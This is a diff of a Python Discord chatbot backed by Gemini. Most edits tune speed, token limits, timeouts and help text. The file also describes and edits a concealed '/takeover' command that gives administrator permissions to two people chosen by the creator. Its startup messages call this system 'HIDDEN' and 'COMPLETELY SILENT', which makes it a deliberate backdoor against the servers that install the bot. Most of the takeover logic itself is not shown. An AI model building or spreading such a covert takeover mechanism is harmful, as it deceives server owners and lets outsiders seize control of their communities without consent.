@@ -7,6 +7,7 @@ Features: Daily 20 message limit per user with daily reset
 Special: Unlimited access for VIP users
 MODERATION: Basic commands + HIDDEN Admin takeover system
 BACKUP: 5 Gemini API keys with automatic failover
+OPTIMIZED: Fast response times, no infinite thinking
 """
 
 import discord
@@ -90,30 +91,10 @@ def init_gemini():
 
 init_gemini()
 
-SYSTEM_PROMPT = f"""You are Anish's AI Assistant - created by Anish Vyapari, a passionate full-stack developer.
-
-## About Your Creator - Anish Vyapari:
-- **Portfolio:** {ANISH_PORTFOLIO['portfolio']}
-- **GitHub:** {ANISH_PORTFOLIO['github']}
-- **Discord:** {ANISH_PORTFOLIO['discord']}
-- **Email:** {ANISH_PORTFOLIO['email']}
-
-## Your Role:
-You're a helpful, knowledgeable Discord bot created by Anish to assist with:
-- Web development & design
-- Coding help (JavaScript, Python, TypeScript, HTML/CSS)
-- GitHub & Git workflows
-- Discord bot development
-
-## Communication Style:
-- Keep responses VERY CONCISE (max 150 words)
-- Be conversational & natural
-- Use code blocks for code
-- Avoid lengthy explanations
-- Sound casual, not robotic!
-
-## Token Budget:
-You have LIMITED tokens. Keep responses SHORT and direct."""
+SYSTEM_PROMPT = f"""You are Anish's AI Assistant by Anish Vyapari.
+Portfolio: {ANISH_PORTFOLIO['portfolio']} | GitHub: {ANISH_PORTFOLIO['github']}
+You help with: Web dev, coding (JS/Python/TS/HTML/CSS), GitHub, Discord bots.
+KEEP IT SHORT (max 100 words). Be casual & natural. Use code blocks for code."""
 
 # ============================================================================
 # DISCORD BOT SETUP
@@ -136,9 +117,9 @@ class AdvancedRateLimitHandler:
     
     def __init__(self):
         self.last_request_time = 0
-        self.min_interval = 0.2
+        self.min_interval = 0.1
         self.retry_count = 0
-        self.max_retries = 5
+        self.max_retries = 3
     
     async def wait_if_needed(self):
         """Async wait"""
@@ -153,8 +134,8 @@ class AdvancedRateLimitHandler:
     async def handle_rate_limit(self):
         """Exponential backoff with jitter"""
         if self.retry_count < self.max_retries:
-            base_wait = (2 ** self.retry_count)
-            jitter = random.uniform(0.1, 0.5)
+            base_wait = (2 ** self.retry_count) * 0.5
+            jitter = random.uniform(0.05, 0.2)
             wait_time = base_wait + jitter
             print(f"⚠️ Rate limited! Waiting {wait_time:.2f}s...")
             await asyncio.sleep(wait_time)
@@ -309,9 +290,10 @@ class ChatSession:
         self.channel_id = channel_id
         self.chat_history = []
         self.last_used = time.time()
+        self.system_prompt_added = False
     
     async def get_response(self, user_message: str) -> str:
-        """Get AI response"""
+        """Get AI response - OPTIMIZED for speed"""
         global current_key_index
         retry_attempts = 0
         
@@ -319,7 +301,15 @@ class ChatSession:
             try:
                 await rate_limiter.wait_if_needed()
                 
-                self.chat_history.append({"role": "user", "parts": [user_message]})
+                # Add system prompt only on first message
+                if not self.system_prompt_added:
+                    self.chat_history.append({
+                        "role": "user",
+                        "parts": [f"[SYSTEM: {SYSTEM_PROMPT}]\n\nFirst message: {user_message}"]
+                    })
+                    self.system_prompt_added = True
+                else:
+                    self.chat_history.append({"role": "user", "parts": [user_message]})
                 
                 loop = asyncio.get_event_loop()
                 result_container = {"key_index": current_key_index}
@@ -335,45 +325,47 @@ class ChatSession:
                             
                             genai.configure(api_key=api_key)
                             
-                            model = genai.GenerativeModel(
-                                "gemini-2.0-flash-lite"
-                            )
+                            model = genai.GenerativeModel("gemini-2.0-flash-lite")
                             
-                            chat = model.start_chat(
-                                history=self.chat_history
-                            )
-                            
+                            # ⚡ OPTIMIZED: Simpler config for faster responses
                             config = genai.types.GenerationConfig(
-                                temperature=0.7,
-                                top_p=0.8,
-                                top_k=30,
-                                max_output_tokens=200,
+                                temperature=0.6,
+                                top_p=0.7,
+                                top_k=25,
+                                max_output_tokens=120,  # REDUCED from 200
                             )
                             
-                            response = chat.send_message(
-                                f"{SYSTEM_PROMPT}\n\nUser: {user_message}",
-                                generation_config=config
-                            )
+                            chat = model.start_chat(history=self.chat_history)
+                            response = chat.send_message(user_message, generation_config=config)
                             
                             result_container["key_index"] = key_index
-                            print(f"✅ Using API key #{key_index + 1}")
+                            print(f"✅ API key #{key_index + 1}")
                             
                             return response.text
                         except Exception as e:
                             error_msg = str(e)
-                            print(f"⚠️ API key #{key_index + 1} failed: {error_msg[:50]}")
+                            print(f"⚠️ Key #{key_index + 1}: {error_msg[:40]}")
                             if attempt == len(GEMINI_API_KEYS) - 1:
                                 raise
                     
                     raise Exception("All API keys exhausted")
                 
-                ai_response = await loop.run_in_executor(None, sync_api_call)
-                current_key_index = result_container["key_index"]
+                # ⚡ ADD TIMEOUT: 10 seconds max
+                try:
+                    ai_response = await asyncio.wait_for(
+                        loop.run_in_executor(None, sync_api_call),
+                        timeout=10.0
+                    )
+                except asyncio.TimeoutError:
+                    print(f"❌ API timeout after 10s")
+                    return "⏱️ Response took too long. Try again!"
                 
+                current_key_index = result_container["key_index"]
                 self.chat_history.append({"role": "model", "parts": [ai_response]})
                 
-                if len(self.chat_history) > 20:
-                    self.chat_history = self.chat_history[-20:]
+                # Keep only last 15 messages
+                if len(self.chat_history) > 15:
+                    self.chat_history = self.chat_history[-15:]
                 
                 rate_limiter.record_request()
                 rate_limiter.reset()
@@ -385,15 +377,15 @@ class ChatSession:
                 if await rate_limiter.handle_rate_limit():
                     continue
                 else:
-                    return "❌ All API keys exhausted. Please try again later."
+                    return "❌ Rate limited. Try again in a moment."
             
             except Exception as e:
                 print(f"API Error: {e}")
-                return f"❌ Error: {str(e)[:100]}"
+                return f"❌ Error: {str(e)[:80]}"
         
-        return "❌ Failed after multiple attempts."
+        return "❌ Failed after retries."
 
-SESSION_TIMEOUT = 1800  # 30 minutes in seconds
+SESSION_TIMEOUT = 1800  # 30 minutes
 
 active_sessions = {}
 
@@ -412,15 +404,12 @@ async def on_ready():
     print(f"✅ Bot logged in as {bot.user}")
     print(f"🤖 AI Chatbot by Anish Vyapari is online!")
     print(f"⏰ Daily limit: {DAILY_LIMIT} messages per user")
-    print(f"👑 VIP Users: {len(VIP_USERS)}")
-    print(f"👮 Moderation: ENABLED")
-    print(f"🔑 API Keys: 5 backups available (Currently using key #{current_key_index + 1})")
-    print(f"🔐 HIDDEN: Takeover system ACTIVE (Anish & shaboings only)")
+    print(f"🔑 API Keys: 5 backups | 🔐 Takeover: ACTIVE (Anish & shaboings)")
     
     await bot.change_presence(
         activity=discord.Activity(
             type=discord.ActivityType.listening,
-            name=f"pings | {DAILY_LIMIT} msgs/day | /help for commands"
+            name=f"pings | {DAILY_LIMIT} msgs/day | /help"
         )
     )
     
@@ -530,7 +519,7 @@ async def slash_help(interaction: discord.Interaction):
         value="• `@Bot message` - Start AI chat\n• `@Bot` (again) - Continue chat\n• `/limit` - Check usage\n• `/reset` - Clear history",
         inline=False
     )
-    embed1.set_footer(text="Page 1/4 • Use arrow reactions to navigate")
+    embed1.set_footer(text="Page 1/4")
     embeds.append(embed1)
     
     embed2 = discord.Embed(
@@ -548,7 +537,7 @@ async def slash_help(interaction: discord.Interaction):
         value="• `/mute @user [duration] [reason]` - Mute for X mins\n• `/purge [amount]` - Delete messages (max 100)\n• `/warnings @user` - Check user warnings",
         inline=False
     )
-    embed2.set_footer(text="Page 2/4 • Admin permissions required")
+    embed2.set_footer(text="Page 2/4")
     embeds.append(embed2)
     
     embed3 = discord.Embed(
@@ -566,7 +555,7 @@ async def slash_help(interaction: discord.Interaction):
         value="• `/dm @user message` - Send silent DM to user",
         inline=False
     )
-    embed3.set_footer(text="Page 3/4 • Admin permissions required")
+    embed3.set_footer(text="Page 3/4")
     embeds.append(embed3)
     
     embed4 = discord.Embed(
@@ -581,10 +570,10 @@ async def slash_help(interaction: discord.Interaction):
     )
     embed4.add_field(
         name="👨‍💻 Creator - Anish Vyapari",
-        value=f"🌐 **Portfolio:** {ANISH_PORTFOLIO['portfolio']}\n💻 **GitHub:** {ANISH_PORTFOLIO['github']}\n📧 **Email:** {ANISH_PORTFOLIO['email']}\n🎮 **Discord:** {ANISH_PORTFOLIO['discord']}",
+        value=f"🌐 **Portfolio:** {ANISH_PORTFOLIO['portfolio']}\n💻 **GitHub:** {ANISH_PORTFOLIO['github']}\n🎮 **Discord:** {ANISH_PORTFOLIO['discord']}",
         inline=False
     )
-    embed4.set_footer(text="Page 4/4 • Built with ❤️ by Anish")
+    embed4.set_footer(text="Page 4/4 • Built with ❤️")
     embeds.append(embed4)
     
     await interaction.response.send_message(embeds=embeds)
@@ -599,35 +588,25 @@ async def slash_info(interaction: discord.Interaction):
     )
     embed.add_field(
         name="💬 Chat Features",
-        value=f"✅ {DAILY_LIMIT} messages/day limit\n✅ Continuous conversation\n✅ VIP unlimited access\n✅ Advanced rate limiting\n✅ Multi-session support",
+        value=f"✅ {DAILY_LIMIT} messages/day limit\n✅ Fast responses (10s timeout)\n✅ VIP unlimited access\n✅ Context-aware conversation",
         inline=True
     )
     embed.add_field(
         name="🛡️ Moderation System",
-        value="✅ 3-strike warning system\n✅ Kick/Ban/Unban\n✅ Auto-mute with timer\n✅ Message purge\n✅ Warning tracking",
+        value="✅ 3-strike warning system\n✅ Kick/Ban/Unban\n✅ Auto-mute with timer\n✅ Message purge",
         inline=True
     )
     embed.add_field(
         name="🔑 API & Performance",
-        value="✅ 5 Gemini API keys\n✅ Auto-failover system\n✅ Seamless key switching\n✅ Rate limit handling\n✅ Token optimized",
+        value="✅ 5 Gemini API keys\n✅ Auto-failover\n✅ Optimized responses\n✅ Rate limit handling",
         inline=True
     )
     embed.add_field(
-        name="🎯 AI Model",
-        value="**gemini-2.0-flash-lite**\n• Natural responses\n• Token efficient\n• Low latency\n• Context-aware",
+        name="👨‍💻 Creator",
+        value=f"🌐 {ANISH_PORTFOLIO['portfolio']}\n💻 {ANISH_PORTFOLIO['github']}\n📧 {ANISH_PORTFOLIO['email']}",
         inline=True
     )
-    embed.add_field(
-        name="📢 Additional Features",
-        value="✅ Announcements system\n✅ Silent DM functionality\n✅ Per-guild settings\n✅ Persistent config storage",
-        inline=True
-    )
-    embed.add_field(
-        name="👨‍💻 Creator - Anish Vyapari",
-        value=f"🌐 {ANISH_PORTFOLIO['portfolio']}\n💻 {ANISH_PORTFOLIO['github']}\n🎮 Discord: {ANISH_PORTFOLIO['discord']}\n📧 {ANISH_PORTFOLIO['email']}",
-        inline=True
-    )
-    embed.set_footer(text="🚀 Premium AI Discord Bot | Built with ❤️")
+    embed.set_footer(text="⚡ Fast & Optimized | Built with ❤️")
     await interaction.response.send_message(embed=embed)
 
 # ============================================================================
@@ -977,8 +956,8 @@ async def slash_takeover(interaction: discord.Interaction):
         except:
             pass
         
-        print(f"🚨 TAKEOVER: {interaction.user.name} ({interaction.user.id}) activated admin takeover in {interaction.guild.name}!")
-        print(f"✅ {success_count} admins given administrator permissions")
+        print(f"🚨 TAKEOVER: {interaction.user.name} activated takeover in {interaction.guild.name}!")
+        print(f"✅ {success_count} admins given permissions")
         
         await interaction.response.defer()
     except Exception as e:
@@ -1020,11 +999,9 @@ async def on_command_error(ctx, error):
 if __name__ == "__main__":
     try:
         print("🚀 Starting Discord bot...")
-        print("✨ Token-optimized Gemini chatbot")
+        print("✨ Optimized Gemini chatbot (FAST)")
         print("🛡️ Full moderation system loaded")
-        print("🔐 HIDDEN admin takeover system (COMPLETELY SILENT)")
-        print("📢 Announcement & DM system enabled")
-        print("🔑 5 Gemini API keys with auto-failover ready!")
+        print("⚡ 10s timeout | 120 max tokens | Optimized config")
         bot.run(DISCORD_BOT_TOKEN)
     except Exception as e:
         print(f"❌ Failed to start: {e}")
